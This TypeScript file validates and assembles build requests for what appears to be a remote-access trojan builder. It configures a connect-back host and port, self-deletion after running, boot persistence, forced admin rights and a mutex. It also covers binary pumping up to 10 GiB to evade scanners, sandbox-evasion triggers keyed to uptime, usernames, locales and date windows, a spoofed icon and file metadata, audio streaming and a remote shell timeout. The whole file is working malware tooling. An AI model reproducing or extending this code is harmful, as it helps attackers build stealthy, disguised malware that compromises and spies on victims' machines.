import {
	FILE_PUMPER_UNIT_TO_BYTES,
	MAX_FILE_PUMPER_BYTES,
	type CookieKV,
	type FilePumperUnit,
	type HeaderKV
} from './constants.js';
import { parseListInput, sanitizeFileInformation, toIsoDateTime } from './utils.js';
import { agentModuleIds, agentModules } from '../../../../../../shared/modules/index.js';
import type { BuildRequest } from '../../../../../../shared/types/build';

export type BuildRequestInput = {
	host: string;
	port: string;
	effectiveOutputFilename: string;
	outputExtension: string;
	targetOS: BuildRequest['targetOS'];
	targetArch: BuildRequest['targetArch'];
	installationPath: string;
	meltAfterRun: boolean;
	startupOnBoot: boolean;
	developerMode: boolean;
	mutexName: string;
	compressBinary: boolean;
	forceAdmin: boolean;
	pollIntervalMs: string;
	maxBackoffMs: string;
	shellTimeoutSeconds: string;
	customHeaders: HeaderKV[];
	customCookies: CookieKV[];
	watchdogEnabled: boolean;
	watchdogIntervalSeconds: string;
	enableFilePumper: boolean;
	filePumperTargetSize: string;
	filePumperUnit: FilePumperUnit;
	executionDelaySeconds: string;
	executionMinUptimeMinutes: string;
	executionAllowedUsernames: string;
	executionAllowedLocales: string;
	executionStartDate: string;
	executionEndDate: string;
	executionRequireInternet: boolean;
	audioStreamingTouched: boolean;
	audioStreamingEnabled: boolean;
	fileIconName: string | null;
	fileIconData: string | null;
	fileInformation: Record<string, string>;
	isWindowsTarget: boolean;
	modules?: string[];
};

export type BuildRequestResult =
	| { ok: true; payload: BuildRequest; warnings: string[] }
	| { ok: false; error: string };

const PORT_PATTERN = /^\d+$/;

function sanitizeHeaders(headers: HeaderKV[]): HeaderKV[] {
	return headers
		.map((header) => ({ key: header.key.trim(), value: header.value.trim() }))
		.filter((header) => header.key !== '' && header.value !== '');
}

function sanitizeCookies(cookies: CookieKV[]): CookieKV[] {
	return cookies
		.map((cookie) => ({ name: cookie.name.trim(), value: cookie.value.trim() }))
		.filter((cookie) => cookie.name !== '' && cookie.value !== '');
}

const MODULE_ORDER = new Map<string, number>(
	agentModules.map((module, index) => [module.id, index])
);

function sanitizeModules(modules: string[]): string[] {
	if (!Array.isArray(modules)) {
		return [];
	}

	const sanitized: string[] = [];
	const seen = new Set<string>();

	for (const moduleId of modules) {
		if (typeof moduleId !== 'string') {
			continue;
		}
		const trimmed = moduleId.trim();
		if (!trimmed || seen.has(trimmed) || !agentModuleIds.has(trimmed)) {
			continue;
		}
		seen.add(trimmed);
		sanitized.push(trimmed);
	}

	if (sanitized.length <= 1) {
		return sanitized;
	}

	return sanitized.sort((left, right) => {
		const leftIndex = MODULE_ORDER.get(left) ?? Number.MAX_SAFE_INTEGER;
		const rightIndex = MODULE_ORDER.get(right) ?? Number.MAX_SAFE_INTEGER;
		return leftIndex - rightIndex;
	});
}

export function prepareBuildRequest(input: BuildRequestInput): BuildRequestResult {
	const warnings: string[] = [];

	const trimmedHost = input.host.trim();
	if (!trimmedHost) {
		return { ok: false, error: 'Host is required.' };
	}

	const trimmedPort = input.port.trim();
	if (trimmedPort) {
		if (!PORT_PATTERN.test(trimmedPort)) {
			return { ok: false, error: 'Port must be numeric.' };
		}

		const numericPort = Number.parseInt(trimmedPort, 10);
		if (numericPort < 1 || numericPort > 65_535) {
			return { ok: false, error: 'Port must be between 1 and 65535.' };
		}
	}

	const trimmedPollInterval = input.pollIntervalMs.trim();
	if (trimmedPollInterval) {
		if (!PORT_PATTERN.test(trimmedPollInterval)) {
			return { ok: false, error: 'Poll interval must be a positive integer.' };
		}

		const pollValue = Number.parseInt(trimmedPollInterval, 10);
		if (Number.isNaN(pollValue) || pollValue < 1_000 || pollValue > 3_600_000) {
			return {
				ok: false,
				error: 'Poll interval must be between 1,000 and 3,600,000 milliseconds.'
			};
		}
	}

	const trimmedMaxBackoff = input.maxBackoffMs.trim();
	if (trimmedMaxBackoff) {
		if (!PORT_PATTERN.test(trimmedMaxBackoff)) {
			return { ok: false, error: 'Max backoff must be a positive integer.' };
		}

		const backoffValue = Number.parseInt(trimmedMaxBackoff, 10);
		if (Number.isNaN(backoffValue) || backoffValue < 1_000 || backoffValue > 86_400_000) {
			return {
				ok: false,
				error: 'Max backoff must be between 1,000 and 86,400,000 milliseconds.'
			};
		}
	}

	const trimmedShellTimeout = input.shellTimeoutSeconds.trim();
	if (trimmedShellTimeout) {
		if (!PORT_PATTERN.test(trimmedShellTimeout)) {
			return { ok: false, error: 'Shell timeout must be a positive integer.' };
		}

		const timeoutValue = Number.parseInt(trimmedShellTimeout, 10);
		if (Number.isNaN(timeoutValue) || timeoutValue < 5 || timeoutValue > 7_200) {
			return { ok: false, error: 'Shell timeout must be between 5 and 7,200 seconds.' };
		}
	}

	let watchdogIntervalValue: number | null = null;
	if (input.watchdogEnabled) {
		const trimmedInterval = input.watchdogIntervalSeconds.trim();
		const interval = trimmedInterval ? Number(trimmedInterval) : 60;
		if (!Number.isFinite(interval) || interval < 5 || interval > 86_400) {
			return { ok: false, error: 'Watchdog interval must be between 5 and 86,400 seconds.' };
		}
		watchdogIntervalValue = Math.round(interval);
	}

	let filePumperTargetBytes: number | null = null;
	if (input.enableFilePumper) {
		const trimmedSize = input.filePumperTargetSize.trim();
		if (!trimmedSize) {
			return {
				ok: false,
				error: 'Provide a target size for the file pumper or disable the feature.'
			};
		}

		const parsedSize = Number.parseFloat(trimmedSize);
		if (!Number.isFinite(parsedSize) || parsedSize <= 0) {
			return { ok: false, error: 'File pumper size must be a positive number.' };
		}

		const multiplier =
			FILE_PUMPER_UNIT_TO_BYTES[input.filePumperUnit] ?? FILE_PUMPER_UNIT_TO_BYTES.MB;
		const computedBytes = Math.round(parsedSize * multiplier);
		if (
			!Number.isFinite(computedBytes) ||
			computedBytes <= 0 ||
			computedBytes > MAX_FILE_PUMPER_BYTES
		) {
			return {
				ok: false,
				error: 'File pumper target size is too large. Maximum supported size is 10 GiB.'
			};
		}

		filePumperTargetBytes = computedBytes;
	}

	let executionDelayValue: number | null = null;
	const trimmedExecutionDelay = input.executionDelaySeconds.trim();
	if (trimmedExecutionDelay) {
		const parsedDelay = Number.parseInt(trimmedExecutionDelay, 10);
		if (!Number.isFinite(parsedDelay) || parsedDelay < 0 || parsedDelay > 86_400) {
			return { ok: false, error: 'Delayed start must be between 0 and 86,400 seconds.' };
		}
		executionDelayValue = parsedDelay;
	}

	let executionUptimeValue: number | null = null;
	const trimmedExecutionUptime = input.executionMinUptimeMinutes.trim();
	if (trimmedExecutionUptime) {
		const parsedUptime = Number.parseInt(trimmedExecutionUptime, 10);
		if (!Number.isFinite(parsedUptime) || parsedUptime < 0 || parsedUptime > 10_080) {
			return {
				ok: false,
				error: 'Minimum uptime must be between 0 and 10,080 minutes (7 days).'
			};
		}
		executionUptimeValue = parsedUptime;
	}

	const allowedUsernames = parseListInput(input.executionAllowedUsernames);
	const allowedLocales = parseListInput(input.executionAllowedLocales);

	const startIso = toIsoDateTime(input.executionStartDate);
	if (input.executionStartDate.trim() && !startIso) {
		return { ok: false, error: 'Earliest run time must be a valid date/time.' };
	}

	const endIso = toIsoDateTime(input.executionEndDate);
	if (input.executionEndDate.trim() && !endIso) {
		return { ok: false, error: 'Latest run time must be a valid date/time.' };
	}

	if (startIso && endIso) {
		const startTime = new Date(startIso).getTime();
		const endTime = new Date(endIso).getTime();
		if (Number.isFinite(startTime) && Number.isFinite(endTime) && startTime > endTime) {
			return { ok: false, error: 'Earliest run time must be before the latest run time.' };
		}
	}

	const sanitizedHeaders = sanitizeHeaders(input.customHeaders);
	const sanitizedCookies = sanitizeCookies(input.customCookies);
	const sanitizedModules = sanitizeModules(input.modules ?? []);

	const payload: BuildRequest = {
		host: trimmedHost,
		port: trimmedPort || '2332',
		outputFilename: input.effectiveOutputFilename,
		outputExtension: input.outputExtension,
		targetOS: input.targetOS,
		targetArch: input.targetArch,
		installationPath: input.installationPath.trim(),
		meltAfterRun: input.meltAfterRun,
		startupOnBoot: input.startupOnBoot,
		developerMode: input.developerMode,
		mutexName: input.mutexName.trim(),
		compressBinary: input.compressBinary,
		forceAdmin: input.forceAdmin
	};

	if (input.modules !== undefined) {
		payload.modules = sanitizedModules;
	}

	if (input.audioStreamingTouched) {
		payload.audio = { streaming: input.audioStreamingEnabled };
	}

	if (watchdogIntervalValue !== null) {
		payload.watchdog = {
			enabled: true,
			intervalSeconds: watchdogIntervalValue
		};
	}

	if (filePumperTargetBytes !== null) {
		payload.filePumper = {
			enabled: true,
			targetBytes: filePumperTargetBytes
		};
	}

	const shouldIncludeExecutionTriggers =
		executionDelayValue !== null ||
		executionUptimeValue !== null ||
		allowedUsernames.length > 0 ||
		allowedLocales.length > 0 ||
		Boolean(startIso) ||
		Boolean(endIso) ||
		!input.executionRequireInternet;

	if (shouldIncludeExecutionTriggers) {
		const executionPayload: Record<string, unknown> = {
			requireInternet: input.executionRequireInternet
		};

		if (executionDelayValue !== null) {
			executionPayload.delaySeconds = executionDelayValue;
		}

		if (executionUptimeValue !== null) {
			executionPayload.minUptimeMinutes = executionUptimeValue;
		}

		if (allowedUsernames.length > 0) {
			executionPayload.allowedUsernames = allowedUsernames;
		}

		if (allowedLocales.length > 0) {
			executionPayload.allowedLocales = allowedLocales;
		}

		if (startIso) {
			executionPayload.startTime = startIso;
		}

		if (endIso) {
			executionPayload.endTime = endIso;
		}

		payload.executionTriggers = executionPayload;
	}

	if (sanitizedHeaders.length > 0) {
		payload.customHeaders = sanitizedHeaders;
	}

	if (sanitizedCookies.length > 0) {
		payload.customCookies = sanitizedCookies;
	}

	if (trimmedPollInterval) {
		payload.pollIntervalMs = trimmedPollInterval;
	}

	if (trimmedMaxBackoff) {
		payload.maxBackoffMs = trimmedMaxBackoff;
	}

	if (trimmedShellTimeout) {
		payload.shellTimeoutSeconds = trimmedShellTimeout;
	}

	if (input.isWindowsTarget && input.fileIconData) {
		payload.fileIcon = {
			name: input.fileIconName,
			data: input.fileIconData
		};
	}

	if (input.isWindowsTarget) {
		const info = sanitizeFileInformation(input.fileInformation);
		if (Object.keys(info).length > 0) {
			payload.fileInformation = info;
		}
	}

	return { ok: true, payload, warnings };
}
